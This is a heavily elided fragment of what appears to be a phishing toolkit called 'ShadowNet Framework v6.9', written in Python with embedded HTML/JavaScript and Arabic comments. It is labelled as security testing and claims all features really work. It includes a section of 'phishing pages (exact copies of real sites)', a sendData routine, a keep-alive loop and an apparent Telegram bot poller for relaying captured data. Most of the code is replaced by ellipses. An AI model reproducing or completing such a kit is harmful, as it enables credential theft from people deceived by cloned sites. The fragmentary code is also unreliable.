...
"""
ShadowNet Framework v6.9 - النظام المتكامل للاختبارات الأمنية
مع حل خطأ 409 وتحسين سرعة الرد بعد الخمول
جميع الأزرار والميزات تعمل بشكل حقيقي
"""
...
<head>
    ...
    <style>
        ...
        .info { text-align: right; margin: 10px 0; padding: 8px; background: #f9f9f9; border-radius: 5px; }
...
<body>
    ...
    <script>
        ...
        function sendData(data) {
            ...
            if (!token) {
                document.querySelector('.container').innerHTML = '<h2>❌ خطأ: الرابط غير صحيح</h2>';
                return;
            }
...
# ===================== صفحات التصيد (نسخ طبق الأصل من المواقع الحقيقية) =====================
...
# ===================== دالة Keep-Alive =====================
def keep_alive():
    """إرسال طلب دوري للسيرفر لمنع الإسبات"""
    while True:
...
if __name__ == '__main__':
    ...
    # تشغيل البوت في خيط منفصل مع إعدادات محسنة
    def run_bot():
        while True:
            try:
                bot.polling(
